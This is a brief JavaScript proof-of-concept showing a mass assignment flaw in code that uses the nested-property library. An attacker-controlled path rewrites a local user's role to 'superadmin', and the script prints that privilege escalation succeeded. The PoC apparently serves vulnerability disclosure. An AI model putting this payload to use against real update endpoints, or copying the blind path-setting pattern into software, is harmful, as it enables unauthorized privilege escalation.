const np = require("nested-property");

console.log("=== Mass Assignment / Privilege Escalation PoC ===\n");

// 1. Simulate a backend user object loaded from a database
const dbUser = {
  id: 42,
  username: "alice",
  role: "user",
  settings: { theme: "light" }
};

// 2. Simulate an attacker sending a malicious JSON payload to an update endpoint
const attackerPayload = {
  path: "role",
  value: "superadmin"
};

console.log("Before Update:");
console.log(dbUser);

// 3. The application blindly uses nested-property to apply the update
np.set(dbUser, attackerPayload.path, attackerPayload.value);

console.log("\nAfter Update:");
console.log(dbUser);

if (dbUser.role === "superadmin") {
  console.log("\n[!] VULNERABILITY CONFIRMED: Privilege Escalation successful via Mass Assignment.");
  console.log("    The attacker overwrote a critical property by controlling the path.");
}
